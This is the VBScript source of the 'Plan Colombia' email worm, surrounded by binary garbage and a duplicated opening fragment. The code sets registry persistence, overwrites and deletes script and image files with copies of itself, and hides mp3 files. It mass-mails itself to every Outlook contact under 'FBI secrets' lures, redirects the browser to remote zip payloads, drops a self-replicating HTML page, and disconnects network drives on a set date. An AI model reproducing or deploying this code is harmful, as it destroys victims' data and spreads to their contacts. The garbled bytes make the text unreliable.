"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                     ¾ À¾ ;;Ğ~ Ü!5à~ IzI;ğ~ < ó5  5ë :ÿÿ   > P»ÿ`;ÿë5ò";p;ÿ#Ìs¸¥Âò€;ÿÂ‘˜¨¨¨º
ûş¹™–›¹´ÂÊ
 ;ÿâĞÂ¦µËQĞF°ûşºµÏ¦·uXÉw×ÀûşO¹·ĞËP°­ézĞûş5)âÊğó×I{øôàûı55(C5KØ{Üúğûı;<ô5ïë"z|{H ¼ı5ô<;,'òô;5 ssHô|ı5;ôôõo <ô<ô5;ô<ô |ı55;qÆkK;ô<55;ô<;0|ı5;<‚¿A<;<!!55ô;@|ı5;5yj<! <KJ55P<ı55AÅ,Kp!Kô5;`<ı5;ú|{¾‚‹†Ñ_<<ô;55p<ı5ôFHü¿ú‚ÆXE"J!;;5€¼ü55;ØW5K[!!ÜI<ô5|üGHô;;ô;zY5;"òK!<<ô; |üÜÀ<;;;H€W"!!!!ô<<ô;°¼ü!÷A;5;>Çæ><!Kôô<ô;À¼üIGô[;JÜôô<<ô;5ĞüüĞüı;;IİK!!<ô<à<ş(ò<!<!!"ÿ^ûğ<şöF]áá]xûøØ5 =ş<Iô5×­‚!KÜIİııGôÜÓ!ØÜ<±‹İø }ı ]şW{±{ÿûÀ½W0}ıòò*@H@=@A"<ô@½ıôô55;55ô<<!<P½ı;;ô5<;ôô!J;`=şô;<;!ô5ô!J;p=ş;;<;K!5ô<İô€=ş;<5KK;ô!K<½ş<!K;;KK<5 ış;<K<ôKKKô°=ÿô<ôJIJJ<À}ÿ;<ôIÜIJ<;Ğ}ÿ;<<JİİJ<ô
à½ÿ;<ôKIIJ<ô
ğ½ÿ<<;!JJJôô
 ¾ÿ!K;<!KKôô~ÿ!!;;ô!!<ô ~ÿô<ô;5;!<;0~ÿô<ô;;!<;@~ÿô<<;;!I!ô5P~ÿô!""HGİAöA:`~ÿÙüsG{Œ…Ñ|Şp~ÿØØJİ×Ü×İÜ!€>ÿÓGGúúÜÜ±Ş<> :ò<;< ¾ °ş Àş 5Ğ¾ ôJ;à¾ ×Óôğ~ <{Ó!  òô; 55 ¿ ÿÿ   < pûş€»ş5;;{ş:O<ÜG<; {ş©•‘Ê5°{şS™–—&5À{ş$ºñšâË#À» Ğ{şE·Êñ™µCL5à;şMµ·ºS555ğ»ıôËÂÂO ô;; |ı;5&ÊB;ô;;55;<ıôôô55;ô;ôôôô üü;;ô<<ô5)õòôôô<ô;5;;0üü5;<!<ô<ôô<<ôôôôôô<!ô@üü555<!<<<<ô<<ô<!ô<<<P¼ü555<<!KWJJ<!!<;<ô<<ô`¼ü5ô;!@]¿Şöôô!<ô55ôôôp¼ü;;55ôö¾†Y"<ô<!<5;<<ô€<ü5;ô;õô5ÜùJKK!!!ô5ô<<ô<ü5;;<;H;J‚ô<GA!<;;ôô<; <ü;ôô<ôô÷‚ww‚Yû_A;5;"ûøô°|û°|üôô<ô<ÒÜÑ…®‰è‚ı;5FúÒØGÀ¼ûÀ¼ü;;JôJ½;5Éb<<;üwÀzG:Ğ¼üĞüı<<I‚òôôò<5*ÂºÒ"à<ş5ö÷®Y<<ô<;5&™¨Tğ<ş Ju=!<;55Ê™‘™O =ş;!Hô;Kôô<<·™™Ê=ş"ÿ K<!<<!ò¹µº =şIİ5!!ÜI;İGÂËºÊ&0}ı İôKÜKIKI‚wFõ@}ıô;AXHş÷{{øY^5P½ı;ô!<YuF ôô5`½ıô<55555;;5p=ş5;;ô;5ô5;5€=ş5<5ô<;!ô55}ş5;<5K!;;ô ış;!5K!;ôô;°=ÿ;!5!J5ô!<À}ÿK5<J<!J<;Ğ}ÿ<5ôK<JJ<ô
à½ÿ;5;<ôII<ôğ½ÿ;ô!!II!<5 ¾ÿôôK!JJK<;¾ÿKôK<KK!ôô ¾ÿI!K5<!!ô;0¾ÿKK!5;ô<ô;@¾ÿ<K<ô;ôô;P¾ÿ5<!<ô;<ôô`~ÿ;<<<<;5K< p~ÿ;<<<<ôGy{w"€~ÿôÑàÿrŞ"ØÜKI<~ÿôzİ!ØIIJ{İKK ~ÿ;õú{õJ<úG°> À>Ğş ôôà¾ Ó!ğ¾ İ{! ¿ GI<¿ ë5 ¿ ÿÿ  # 7 À;ÿĞ»ş5;5à{şB;<ô;5ğ{şC¸°©O55 |şÏ™–—¦ò5ô;|şS¨˜™µCĞ(5;ô üı5QºSš¹ğD5;50¼ıô5Ê¶¦©µĞS5;;5@<ıô<5õN¹ÏºQ ô;5;5ôPüü;ô<<ô5ìEËCõô;;55ô<ô`üüôôô<<ôëï(5;ô;55<<<<;p¼ü5;ô<!!!;5;ô;5<!<<<ô€¼ü55ô<JJ!;5;;;5<!<!<ô<ô|ü5;5;5KIİ!ô<<ôô!<<<ôô<< <ü5;;5<!III\I!!!<<;ô;<<5°<ü5;;ô;55<<"öqI<ôô<ô;;5ôô;À<ü5ô;ô;5;ô@o¾i<ôôô;;ôôô;Ğ|ûĞ|ü;ôô5 õôÙˆs!ôôôô;;ô<<;à|ûà¼üô58`pX+ | <<>òô5;ôKô5ğ¼üğüıÙ|ÅÅ€oZwÉW?5;ô!;; ııõ KôG½Óz‚½Üô5ô<ôô5ııò< H½+ô"@;!ô<< ıı*ô; ú|`;55;;5ô<<ô50ıı<JøIØJ<ô5;!K5ô!!;@ıı5 İK;!<!ôúúŞH;ô öõP½ı5õûA "ŞI!ö@Aò5øŞÑK`½ı<;òHHÙÒ ;5<ô5`=IİÜJp½ı5<!K;AHô;!ô5p}<İIÓ€=ş<ô55;555Jô€}!Ø{ú=ş5ô5ô5!ô}ôÑ½ĞËÂ& ışô5!;;K<; }E¶µ··%°=ÿ5ôKô<KK<°½CâQ(À=ÿôKôK!J<5À=Ğ=ÿô!;K;I!;
à½ÿ5Jô!5J!<
ğ½ÿJô!;J!< ¾ÿJ5ô!ôK<<;¾ÿIô<ôK!<ô ¾ÿI;<<ô<!<ô0¾ÿI<<ô5ô!<ô@¾ÿKI<ô;<<ôP¾ÿ5<J!ôôôô`~ÿ;<!Kô5<<ôp~ÿô<!!<;5K!<€~ÿ;<<!<ôò÷wwø~ÿ5ô<<!<ô;×ÓzK ~ÿ"úwÑFÙHKÓÜKİ°>ÿöÜ{zôÜG"yGòÀ~ÿõ"!ôz!Ğ~ ;àş JKğ¾ ôØJ; ¿ ;ôô5¿ 555 ¿ :ÿÿ   9 {ÿ ûş°»şï5ô;;5À{şÎØ°}S;	Ğ{şD›––™Ê5à{şC——&L 55ğûı&ĞÊµ™µâO55ô ¼ı5;N¨·©î·S&5;;<ı;ô5&Uµ¹¹ĞQ;ô; <ı;<<;CÂËB<ô;;;0üü;;<<ô5ìòMò;;ôô;5ôô@üü5ô<!!<ë;ô;5;ô<<;Püü5ôKKK;;;<<;ô<<<<<`üü555<KI<ôô;ô;ô<<<;;ô5p¼ü55ô!IK!"!ôô<<<<ô<<<€<ü555<<KúZİ<K!<ôô<!!<üûöHô5;;5;ôbwWJô;<<ô;ô<!ô5 <ü!sı ô;;ò;û†v@<ôô<ô;;;<ô5°|û°<üÜ…Hô;j_õ5|Ò<!ôô<<;;;ôô;À|û	À|üİF"½u?½EôôAô<55ôôô5Ğ¼ûĞ¼üĞüıûÜÀ¿vWsq= ;5;ôK5àüı;;;wÙ×­¾vlô;5<<;;ğüıôô{;JZô;55ôôôô ııôG|Z<ô;5ôôô!ôıı<<ösAôô;55;5!<ô; ıı;JIòI!ôô;ô<<<"Göò0½ıAö<!!İI<×sòÓúÑyô@}ı;;şX àİİKK"½üõJØÜØ;P½ı5;FH*Fszú^"ô5KÓKI;`½ıô!ôEH<<!;Ó±‚Øp=ş555;;ô!<5uŸÃ€}şrem  ===============================================================================================
rem  "Plan Colombia" virus v1.0
rem  by Sand Ja9e Gr0w   (www.colombia.com)

rem  Dedicated to all the people that want to be hackers or crackers, in Colombia  
rem  This program is also a protest act against the violence and corruption that Colombia lives...
rem  I always wanting that all this finishes, I have said...


rem  Santa fe de Bogotá 2000/09
rem  I dedicate to all you the song "GoodBye" of Andreas Bochelli
rem  =================================================================================================


rem  Thanks God..!
rem  A greeting for "Lina María" from "Santa fe de Bogotá"
rem  A greeting for "Tizo" from "Spain"
rem  And One kicked of tail to my friends, "eL ChE" and "ThE SpY"

rem  okay, ok... 
rem  my baby start here...

 
On Error Resume Next
dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow,polyn,numero,polye
eq=""
ctr=0

randomize
numero = Int(Rnd * 3) + 1
polye = ".GIF.vbs"
If numero = 1 Then
  polye = ".BMP.vbs"
 Else
  If numero = 2 Then
    polye = ".JPG.vbs"
  End If
End If


polyn="\"&polyname(Int(Rnd * 5) + 4)&polye

Set fso = CreateObject("Scripting.FileSystemObject")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
If Day(Now) = 17 And Month(Now) = 9 Then
  MsgBox "Dedicated to my best brother=>Christiam Julian(C.J.G.S.)" & Chr(13) & "Att.  " & polyname(5) & "   (M.H.M. TEAM)"
  killnet()
End If



sub main()
On Error Resume Next
dim wscr,rr
set wscr=CreateObject("WScript.Shell")
rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
end if
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy(dirsystem&"\LINUX32.vbs")
c.Copy(dirwin&"\reload.vbs")
c.Copy(dirsystem&polyn)
regruns()
html()
spreadtoemail()
listadriv()
end sub



sub regruns()
On Error Resume Next
Dim num,downread,res
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\LINUX32",dirsystem&"\LINUX32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\reload",dirwin&"\reload.vbs"
downread=""
downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
if (downread="") then
  downread="c:\"
end if

rem   acepta nombres largos..?
if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
  Randomize
  Randomize
  num = Int((4 * Rnd) + 1)

  rem  fatal => send virii
  if num = 2 then 
    regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/macromedia32.zip"
   else
    rem  oh,, a picture.. nice :)  
    if num = 3 then
        regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux321.zip"       
      else
       rem  oh,, other picture  =:()
       if num = 4 then
         regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://members.fortunecity.com/plancolombia/linux322.zip"
       end if 
    end if  
 end if
end if

if (fileexist(downread&"\MACROMEDIA32.zip")=0) then
  res = Shell("copy " & downread & "\MACROMEDIA32.zip  " & dirwin & "\important_note.txt", vbHide)
  regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\plan colombia",dirwin&"\important_note.txt"
  regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"
 else
  if (fileexist(downread&"\linux321.zip")=0) then
     Kill (dirwin & "\logos.sys")
     res = Shell("copy " & downread & "\linux321.zip  " & dirwin & "\logos.sys", vbHide)
     regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
    else
      if (fileexist(downread&"\linux322.zip")=0) then
        Kill (dirwin & "\logow.sys")
        res = Shell("copy " & downread & "\linux322.zip  " & dirwin & "\logow.sys", vbHide)  
        regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","about:blank"     
      end if   
  end if
end if
end sub



sub listadriv
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives

For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
  folderlist(d.path&"\")
 end if
Next

listadriv = s
end sub



sub infectfiles(folderspec)
On Error Resume Next
dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
set f = fso.GetFolder(folderspec)
set fc = f.Files

for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
if (ext="vbs") or (ext="vbe") then
  set ap=fso.OpenTextFile(f1.path,2,true)
  ap.write vbscopy
  ap.close
 else
  if(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct")  or (ext="hta") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   bname=fso.GetBaseName(f1.path)
   set cop=fso.GetFile(f1.path)
   cop.copy(folderspec&"\"&bname&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="jpg") or (ext="jpeg") then
   set ap=fso.OpenTextFile(f1.path,2,true)
   ap.write vbscopy
   ap.close
   set cop=fso.GetFile(f1.path)
   cop.copy(f1.path&".vbs")
   fso.DeleteFile(f1.path)  
 else
  if(ext="mp3") or (ext="mp2") then
   set mp3=fso.CreateTextFile(f1.path&".vbs")
   mp3.write vbscopy
   mp3.close
   set att=fso.GetFile(f1.path)
   att.attributes=att.attributes+2
 end if
 end if
 end if
end if
next

end sub



sub folderlist(folderspec)
On Error Resume Next
dim f,f1,sf
set f = fso.GetFolder(folderspec)
set sf = f.SubFolders

for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
next

end sub


sub regcreate(regkey,regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey,regvalue
end sub


function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget=regedit.RegRead(value)
end function


function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
  msg = 0
else
  msg = 1
end if
fileexist = msg
end function


function folderexist(folderspec)
On Error Resume Next
dim msg
if (fso.GetFolderExists(folderspec)) then
 msg = 0
else
 msg = 1
end if
fileexist = msg
end function



sub spreadtoemail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,correoad,b,regedit,regv,regad,textosub,textobod

set regedit=CreateObject("WScript.Shell")
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")

Randomize
numero = Int(Rnd * 3) + 1
textosub = ""
If numero = 1 Then
  textosub = "US PRESIDENT AND FBI SECRETS =PLEASE VISIT => (http://WWW.2600.COM)<="
 Else
  If numero = 2 Then
    textosub = polyname(6)
  End If
End If


Randomize
numero = Int(Rnd * 3) + 1
textobod = ""
If numero = 1 Then
  textobod = "VERY JOKE..! SEE PRESIDENT AND FBI TOP SECRET PICTURES.."
 Else
  If numero = 2 Then
    textobod = polyname(10)
  End If
End If


for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a)
 if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 
  for ctrentries=1 to a.AddressEntries.Count
   correoad=a.AddressEntries(x)
   regad=""
   regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad)
   if (regad="") then
     set correo=out.CreateItem(0)
     correo.Recipients.Add(correoad)
     correo.Subject = textosub
     correo.Body = vbcrlf&textobod
     correo.Attachments.Add(dirsystem&polyn)
     correo.Send
     regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&correoad,1,"REG_DWORD"
   end if
     x=x+1
  next

  regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
 else
   regedit.RegWrite  "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count
end if
next

Set out=Nothing
Set mapi=Nothing
end sub


Function polyname(n)
Dim i, vector, texto, pos
on error resume next
rem polyformic ( ohhhh yeahhh...) very good polyformic engine  :() by Sand Ja9e Gr0w

vector = Array("A", "E", "I", "O", "U")
texto = ""
Randomize
For i = 1 To n
  Randomize
  rem  consonante
  texto = texto&Chr(Int((Rnd * 25) + 65))
  i = i + 1
  If i > n Then
   exit for
  end if
  rem  vocal
  texto = texto&vector(Int((Rnd * 4) + 1))
  Randomize
Next

polyname = texto
End Function




sub html
On Error Resume Next
dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
dta1="<HTML><HEAD>"&_
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#US-PRESIDENT-AND-FBI-SECRETS.HTM# -#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>M.H.M TEAM <?-?p><p>Colombia<BR>- Please press #-#YES#-# button for see secret pictures<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>Hello Colombia...! Since Here, after, since other part of World..<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"&vbcrlf& _
  "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
  "<!--"&vbcrlf& _
  "on error resume next"&vbcrlf& _
  "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
  "aw=1"&vbcrlf& _
  "code="

  dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
  "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
  "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
  "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
  "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
  "set wri=fso.CreateTextFile(dirsystem&@-@^-^LINUX32.vbs@-@)"&vbcrlf& _
  "wri.write code4"&vbcrlf& _
  "wri.close"&vbcrlf& _
  "if (fso.FileExists(dirsystem&@-@^-^LINUX32.vbs@-@)) then"&vbcrlf& _
  "if (err.number=424) then"&vbcrlf& _
  "aw=0"&vbcrlf& _
  "end if"&vbcrlf& _
  "if (aw=1) then"&vbcrlf& _
  "document.write @-@ERROR: can#-#t load Pictures. IE internal Error@-@"&vbcrlf& _
  "window.close"&vbcrlf& _
  "end if"&vbcrlf& _
  "end if"&vbcrlf& _
  "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
  "regedit.RegWrite  @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^LINUX32@-@,dirsystem&@-@^-^LINUX32.vbs@-@"&vbcrlf& _
  "?-??-?-->"&vbcrlf& _
  "<?-?SCRIPT>"

  dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
  dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""")
  dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
  dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
  dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
  dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""")
  dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
  dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
  set fso=CreateObject("Scripting.FileSystemObject")
  set c=fso.OpenTextFile(WScript.ScriptFullName,1)
  lines=Split(c.ReadAll,vbcrlf)
  l1=ubound(lines)

  for n=0 to ubound(lines)
    lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91))
    lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
    lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37))
    if (l1=n) then
      lines(n)=chr(34)+lines(n)+chr(34)
     else
      lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _"
   end if
  next

  set b=fso.CreateTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM")
  b.close
  set d=fso.OpenTextFile(dirsystem+"\US-PRESIDENT-AND-FBI-SECRETS.HTM",2)
  d.write dt5
  d.write join(lines,vbcrlf)
  d.write vbcrlf
  d.write dt6
  d.close
end sub



sub killnet()
Dim intDrive,strDrive,WSHNetwork

on error resume next


Set WSHNetwork = WScript.CreateObject("WScript.Network")

    For intDrive = 26 To 5 Step -1       
               strDrive = Chr(intDrive + 64) & ":"        
               WSHNetwork.RemoveNetworkDrive strDrive
    Next

rem  bye net connection ...                 :-(
Set WSHNetwork=Nothing

end sub
                                                                                                                     €»ü·™™D€» 55ûüĞ™›Ë» 5;;5 ûüğš¨ » ;ôô;°ûü'¶„G°» ;ôôôÀûüFw‚ô;À{ %O5;;;&ğĞ»üİIÜİJĞ{ ìS5;;5CğàûüôİİŞz;à;ÿìD5(&ğûüsø"ô;55ôô55ôìĞºÏĞ(; üüò;;ôôôô5;<5;ôô&º¹&ôôüü5ô5;ôôôô<<ô;ô<óOµâ#<ô55 <ı;55;<!<<<<;;<ô<<<<<<ô5ô0<ı5ô<<ô;;ô5<ôô<<ô<<;;;<ô@¼ı5ôô;55;;ôô;ôôô<;;<ôôôôP<ş;;5;55ôô;5;ôô5ôô5ôô;`¼ş5;;;5;ôôôôôô;5;5;ôô;p¼ş5;;;;ô<<ôôô555;ô;;5SQ€üş5;;ô;ô<<<ô;555;ô;;;SËüş;;ô;ô<<<ô5;5ô;;;ô&~¹ üş5ôôôôô<ô;;;55ôô;<Iu°üş;ô;;ôô;ô;5;<<ô5;öIÀüşò;ô<<;;;ôôô;ô<<ô5;ö"Ğüş5 "<ô<ôô<<<ô55<ôô;5"õà¼ş5!øHHöö !<<< ;5ğ|ş5ÿÓ<øs÷FŞØú"*ğ| =ş55;ÑÓØØz!IKİ!<ıı5ôô<"ÙssGİÓú"üõ ½ıôôô!;5ô  AAAA<50}ı;;ôôô;<55;55ôô;5@=ı;ôôôô;5;55555;ô;;;Pıü5ôôôô;55Pı 5;5;;`½ü;ôôôôô5
`½55ô;;	p½ü5ôôô<<ôp=;ôô;5	€½ü;;ôô<<;€};;;;;½ü;;;ôôô};;;; ½üô;;;;; ½5;;;	°}ü5ôô<ôô;°=ÿ°ı°½;;;À}üHööGöİ<Àı;ô;Ğ}ü;İ|‚HGÜĞıôôòõà}üöÜÓsàı<÷Şôğ}ü5!"ğ=<Óİ ~ı >õÜK~ı<> ~ıô >:0~ı50>@~ı@>P>ıP¾`şüpşü:€şüÿÿ  % 9 {ş#Q$ {şÌ¨Sì0{şµ™—µ·	@{şµ—–ºP{şË™™(`;ş:S(pûıŞw· €ûı5ÜÜİİûıJÜİK ûıs‚sØ {°ûıôöøGA°;ë55Àûı;<<!ôÀ;;;;5Ğûı5<<K!;Ğ;ôôô;àûıô!KK<àû ;ôô;	ğûı;!!Iô5ğû EB;;;5C% üıô<Kô;;&C5;;ëEì<ş5!J<ô;<ô55)$ë$õ |ş<!<ôô<;;;ô'ĞÏÂËóô0|şô<!<<<;;ôòEÏ¶µĞ#<ô;@|ş5<!!<<<;ô<òOÂĞN <ô;5P¼ş;<ô;;ô;;<ôô<<ô<!ô5;ô`¼ş;;55;;;<ôô<ôô<<;ô;;ôpüş;5;;5;ôô;ôôô<;;ô5;;€üş5;;;5;ô;555;;5;5555üş5;ô;;;ôôô;;;5555;55¼# üş5;;ôô;ôôôôô55;;55;6·D°üş;;ô;;ôôôô;5;;5;;Ğ¦SÀüş5;ôô;ôôô;555;ô;5ôøğĞüşõ;5;ôô;ôô;;;55ôôô;5ôGsàüş òòô<ô;;;;;;àüôôô;;;ü"ğ¼ş "^ö <<<ôôô5ôô;<Ş; }ş5AİJ úÙŞ öIKò ½=ş5ô;òàs!İ×Ø<İİJô ııôôôô<ûŞúØŞús!öò0½ı;ôôôô<5; " "  5@}ıôô;555ô5555;;5P}ıô<<;55;;5`=ı5<<ô;;`};5p=ıô<<ôôp=;;€ıü5ô<ô<ô€}ôô;5ıü;ôô<<5};ô;; ıüôô<!< ½5<ô°½ü:ôô<<<°ış°½ô<5:À½ü;ôô<<;À½;<ôĞ}üòôô<K"Ğı<<à}üøŞÀwööàıô<ğ}ü;ÜIJúğ=5<õ ~üK! >õûö~ı>õys; ~ıô >Üú0~ı<0>5:@~ı@>P~ıP>`~ı`¾pşü€şü:şüÿÿ  ) 5 `» p{ 5€{ 5;;{ ;ôô; { ;ôô;°; E#;;ô5D(À; CE5;;5S&	Ğûÿ&5#à»ÿ;&ÏÂºĞò;ğ»û& *ğûş5;¹¦Ï&<ô <ûSºsÜJ |ş;ô;;<LÎĞLô<<55#üú¹¶ÊÜsøô;5;ô<<ô;;;<<ô<ô;ôô5;55# üúM¨ÊNII<ôôôôôôô!!<<<<;;<<<;;5ô;;55;$0üúâğõ!<<<<ô;;ô!!!<;;ôôô<<ô;ôô;55; @üû;;ôôôô55ô<<<<;ôô;ô<<<<<<5ô5P|ü;;;55;ôô<ôô<ôôô<<<<<ô;ô55P<"`¼ü55;ôôô<<ô;<<<<<;;;5;âÂC